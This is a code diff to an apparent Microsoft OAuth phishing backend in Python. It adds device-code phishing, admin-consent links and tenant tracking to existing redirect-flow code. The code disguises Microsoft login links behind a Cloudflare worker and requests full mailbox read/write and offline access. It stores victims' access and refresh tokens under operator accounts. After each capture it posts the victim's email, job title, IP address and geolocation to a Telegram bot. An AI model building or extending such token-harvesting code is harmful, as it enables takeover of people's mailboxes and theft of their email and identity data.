@@ -3,9 +3,16 @@ from datetime import datetime, timedelta
 from urllib.parse import urlencode, quote_plus, unquote
 import requests
 import os
+import time
 
 from db import SessionLocal, init_db
-from models import TenantToken, SavedUser, ConnectInvite
+from models import (
+    TenantToken,
+    SavedUser,
+    ConnectInvite,
+    TenantConsent,
+    TenantConsentStatus,
+)
 
 
 # =========================
@@ -14,23 +21,25 @@ from models import TenantToken, SavedUser, ConnectInvite
 CLIENT_ID = "3d3d5a12-09a4-4163-bab2-0188bf65ddd1"
 CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
 REDIRECT_URI = "https://oauth-backend-7cuu.onrender.com/auth/callback"
+
 TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
 AUTHORIZE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
+DEVICE_CODE_URL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode"
+DEVICE_TOKEN_URL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/token"
 
-# Explicitly select jobTitle too
 GRAPH_ME_URL = (
     "https://graph.microsoft.com/v1.0/me"
     "?$select=id,displayName,mail,userPrincipalName,jobTitle"
 )
 
+GRAPH_SCOPES = "User.Read Mail.Read Mail.ReadWrite offline_access"
+
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
 
-# Example:
-# https://microsoft-login-redirect.dorseym410.workers.dev
 CLOUDFLARE_WORKER_BASE_URL = os.environ.get("CLOUDFLARE_WORKER_BASE_URL", "").rstrip("/")
+ADMIN_CONSENT_TENANT = os.environ.get("ADMIN_CONSENT_TENANT", "organizations")
 
-# legacy DB compatibility for tenant_tokens.session_id NOT NULL
 DEFAULT_SESSION_ID = "jwt-only"
 
 
@@ -49,7 +58,7 @@ def send_telegram_alert(message: str):
     }
 
     try:
-        res = requests.post(url, data=payload)
+        res = requests.post(url, data=payload, timeout=20)
         if res.status_code != 200:
             print(f"❌ Telegram error: {res.text}")
     except Exception as e:
@@ -153,19 +162,69 @@ def save_saved_user(admin_user_id: str, target_user_id: str, job_title: str | No
 
 
 # =========================
-# INVITE SUPPORT
+# TENANT CONSENT SUPPORT
 # =========================
-def create_connect_invite(admin_user_id: str):
+def save_or_update_tenant_consent(
+    admin_user_id: str,
+    tenant_hint: str,
+    admin_consent_url: str | None = None,
+    status: TenantConsentStatus = TenantConsentStatus.PENDING,
+    notes: str | None = None,
+):
     init_db()
     db = SessionLocal()
 
     try:
-        # random-looking token for the worker path
+        row = (
+            db.query(TenantConsent)
+            .filter(
+                TenantConsent.admin_user_id == admin_user_id,
+                TenantConsent.tenant_hint == tenant_hint
+            )
+            .first()
+        )
+
+        now_ts = int(time.time())
+
+        if not row:
+            row = TenantConsent(
+                admin_user_id=admin_user_id,
+                tenant_hint=tenant_hint,
+                admin_consent_url=admin_consent_url,
+                status=status,
+                notes=notes,
+                created_at=now_ts,
+                updated_at=now_ts,
+            )
+            db.add(row)
+        else:
+            if admin_consent_url:
+                row.admin_consent_url = admin_consent_url
+            if status:
+                row.status = status
+            if notes is not None:
+                row.notes = notes
+            row.updated_at = now_ts
+
+        db.commit()
+    finally:
+        db.close()
+
+
+# =========================
+# INVITE SUPPORT
+# =========================
+def create_connect_invite(admin_user_id: str, tenant_hint: str | None = None):
+    init_db()
+    db = SessionLocal()
+
+    try:
         invite_token = f"{uuid.uuid4().int % 10**7}-{uuid.uuid4().int % 10**12}-{uuid.uuid4().hex[:10]}"
 
         invite = ConnectInvite(
             admin_user_id=admin_user_id,
             invite_token=invite_token,
+            tenant_hint=tenant_hint,
             is_used=False
         )
         db.add(invite)
@@ -218,12 +277,6 @@ def mark_connect_invite_used(invite_token: str, resolved_user_id: str | None = N
 # HELPERS
 # =========================
 def wrap_with_cloudflare_worker(target_url: str, link_token: str | None = None):
-    """
-    Returns either:
-    - raw Microsoft URL if worker base URL is not configured
-    - workers.dev path-style URL:
-      https://worker.subdomain.workers.dev/<token>?target=<encoded-target>
-    """
     if not CLOUDFLARE_WORKER_BASE_URL:
         return target_url
 
@@ -240,7 +293,7 @@ def build_authorize_url(state_value: str, link_token: str | None = None):
         "response_type": "code",
         "redirect_uri": REDIRECT_URI,
         "response_mode": "query",
-        "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
+        "scope": GRAPH_SCOPES,
         "state": quote_plus(state_value),
         "prompt": "select_account"
     }
@@ -254,9 +307,17 @@ def build_authorize_url(state_value: str, link_token: str | None = None):
     return wrapped_login_url
 
 
+def generate_admin_consent_url(tenant: str | None = None):
+    tenant_value = tenant or ADMIN_CONSENT_TENANT
+    return (
+        f"https://login.microsoftonline.com/{tenant_value}/adminconsent"
+        f"?client_id={CLIENT_ID}"
+    )
+
+
 def fetch_graph_identity(access_token: str):
     headers = {"Authorization": f"Bearer {access_token}"}
-    res = requests.get(GRAPH_ME_URL, headers=headers)
+    res = requests.get(GRAPH_ME_URL, headers=headers, timeout=30)
     data = res.json() if res.content else {}
 
     resolved_user_id = (
@@ -279,7 +340,7 @@ def build_device_info(client_ip: str = None, user_agent: str = None):
 
     if client_ip:
         try:
-            loc_resp = requests.get(f"https://ipinfo.io/{client_ip}/json")
+            loc_resp = requests.get(f"https://ipinfo.io/{client_ip}/json", timeout=10)
             if loc_resp.ok:
                 loc = loc_resp.json()
                 location_str = f"{loc.get('city')}, {loc.get('region')}, {loc.get('country')}"
@@ -297,7 +358,6 @@ def build_device_info(client_ip: str = None, user_agent: str = None):
 # LOGIN LINK GENERATION
 # =========================
 def generate_login_link(user_id: str):
-    # direct per-user flow
     state_value = f"user:{user_id}"
     print(f"DEBUG: Generated state_value: {state_value}")
 
@@ -305,18 +365,137 @@ def generate_login_link(user_id: str):
     return build_authorize_url(state_value, link_token=visible_link_token)
 
 
-def generate_org_connect_link(admin_user_id: str):
-    # generic invite flow
-    invite_token = create_connect_invite(admin_user_id)
+def generate_org_connect_link(admin_user_id: str, tenant_hint: str | None = None):
+    invite_token = create_connect_invite(admin_user_id, tenant_hint=tenant_hint)
     state_value = f"invite:{invite_token}"
     print(f"DEBUG: Generated org invite state_value: {state_value}")
 
-    # use the invite token itself in the worker path
     return build_authorize_url(state_value, link_token=invite_token)
 
 
 # =========================
-# TOKEN EXCHANGE
+# DEVICE CODE FLOW
+# =========================
+def start_device_code_flow():
+    payload = {
+        "client_id": CLIENT_ID,
+        "scope": GRAPH_SCOPES
+    }
+
+    res = requests.post(
+        DEVICE_CODE_URL,
+        data=payload,
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        timeout=30
+    )
+
+    data = res.json() if res.content else {}
+
+    if res.status_code >= 400 or "error" in data:
+        error_message = data.get("error_description") or data.get("error") or res.text
+        raise Exception(f"Device code start failed: {error_message}")
+
+    return {
+        "device_code": data["device_code"],
+        "user_code": data["user_code"],
+        "verification_uri": data["verification_uri"],
+        "message": data["message"],
+        "expires_in": data["expires_in"],
+        "interval": data["interval"]
+    }
+
+
+def poll_device_code_flow(device_code: str, admin_user_id: str | None = None, client_ip: str = None, user_agent: str = None):
+    payload = {
+        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+        "client_id": CLIENT_ID,
+        "device_code": device_code
+    }
+
+    res = requests.post(
+        DEVICE_TOKEN_URL,
+        data=payload,
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        timeout=30
+    )
+
+    data = res.json() if res.content else {}
+
+    if res.status_code == 200 and "access_token" in data:
+        access_token = data["access_token"]
+        identity = fetch_graph_identity(access_token)
+        resolved_user_id = identity["resolved_user_id"]
+        job_title = identity["job_title"]
+        profile = identity["profile"]
+
+        if not resolved_user_id:
+            raise Exception("Could not resolve Microsoft user identity from /me")
+
+        device_info = build_device_info(client_ip, user_agent)
+        save_token(resolved_user_id, data, device_info)
+
+        if admin_user_id:
+            save_saved_user(admin_user_id, resolved_user_id, job_title)
+
+        email = profile.get("userPrincipalName") or profile.get("mail") or "unknown"
+
+        send_telegram_alert(
+            f"Resolved User ID: {resolved_user_id}\n"
+            f"Job Title: {job_title or 'unknown'}\n"
+            f"Admin/User Context: {admin_user_id or 'unknown'}\n"
+            f"Email: {email}\n"
+            f"IP: {client_ip or 'unknown'}\n"
+            f"Location: {device_info.get('location', 'unknown')}\n"
+            f"Flow: device_code"
+        )
+
+        return {
+            "status": "complete",
+            "resolved_user_id": resolved_user_id,
+            "job_title": job_title,
+            "profile": profile
+        }
+
+    error_code = data.get("error")
+    error_description = data.get("error_description", "")
+
+    if error_code == "authorization_pending":
+        return {
+            "status": "pending",
+            "error": error_code,
+            "detail": error_description
+        }
+
+    if error_code == "authorization_declined":
+        return {
+            "status": "declined",
+            "error": error_code,
+            "detail": error_description
+        }
+
+    if error_code == "expired_token":
+        return {
+            "status": "expired",
+            "error": error_code,
+            "detail": error_description
+        }
+
+    if error_code == "bad_verification_code":
+        return {
+            "status": "error",
+            "error": error_code,
+            "detail": error_description
+        }
+
+    return {
+        "status": "error",
+        "error": error_code or "unknown_error",
+        "detail": error_description or res.text
+    }
+
+
+# =========================
+# REDIRECT FLOW TOKEN EXCHANGE
 # =========================
 def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_agent: str = None):
     init_db()
@@ -326,14 +505,14 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
 
     token_payload = {
         "client_id": CLIENT_ID,
-        "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
+        "scope": GRAPH_SCOPES,
         "code": code,
         "redirect_uri": REDIRECT_URI,
         "grant_type": "authorization_code",
         "client_secret": CLIENT_SECRET
     }
 
-    response = requests.post(TOKEN_URL, data=token_payload)
+    response = requests.post(TOKEN_URL, data=token_payload, timeout=30)
     result = response.json()
 
     if "error" in result:
@@ -349,11 +528,10 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
         raise Exception("Could not resolve Microsoft user identity from /me")
 
     device_info = build_device_info(client_ip, user_agent)
-
-    # save token under the REAL Microsoft identity
     save_token(resolved_user_id, result, device_info)
 
     admin_user_id_for_saved_user = None
+    tenant_hint = None
 
     if decoded_state.startswith("user:"):
         requested_user_id = decoded_state.split("user:", 1)[1]
@@ -365,6 +543,7 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
 
         if invite:
             admin_user_id_for_saved_user = invite.admin_user_id
+            tenant_hint = getattr(invite, "tenant_hint", None)
             mark_connect_invite_used(invite_token, resolved_user_id, job_title)
 
     else:
@@ -373,16 +552,21 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
     if admin_user_id_for_saved_user:
         save_saved_user(admin_user_id_for_saved_user, resolved_user_id, job_title)
 
-    email = (
-        profile.get("userPrincipalName")
-        or profile.get("mail")
-        or "unknown"
-    )
+    if admin_user_id_for_saved_user and tenant_hint:
+        save_or_update_tenant_consent(
+            admin_user_id=admin_user_id_for_saved_user,
+            tenant_hint=tenant_hint,
+            status=TenantConsentStatus.APPROVED,
+            notes=f"Tenant approved via successful user sign-in for {resolved_user_id}"
+        )
+
+    email = profile.get("userPrincipalName") or profile.get("mail") or "unknown"
 
     message = (
         f"Resolved User ID: {resolved_user_id}\n"
         f"Job Title: {job_title or 'unknown'}\n"
         f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
+        f"Tenant Hint: {tenant_hint or 'unknown'}\n"
         f"Email: {email}\n"
         f"IP: {client_ip or 'unknown'}\n"
         f"Location: {device_info.get('location', 'unknown')}"
@@ -395,7 +579,8 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
         "resolved_user_id": resolved_user_id,
         "job_title": job_title,
         "profile": profile,
-        "admin_user_id": admin_user_id_for_saved_user
+        "admin_user_id": admin_user_id_for_saved_user,
+        "tenant_hint": tenant_hint
     }
 
 
@@ -410,13 +595,13 @@ def refresh_token(user_id: str):
 
     data = {
         "client_id": CLIENT_ID,
-        "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
+        "scope": GRAPH_SCOPES,
         "refresh_token": token_record.refresh_token,
         "grant_type": "refresh_token",
         "client_secret": CLIENT_SECRET
     }
 
-    response = requests.post(TOKEN_URL, data=data)
+    response = requests.post(TOKEN_URL, data=data, timeout=30)
     result = response.json()
 
     if "error" in result:
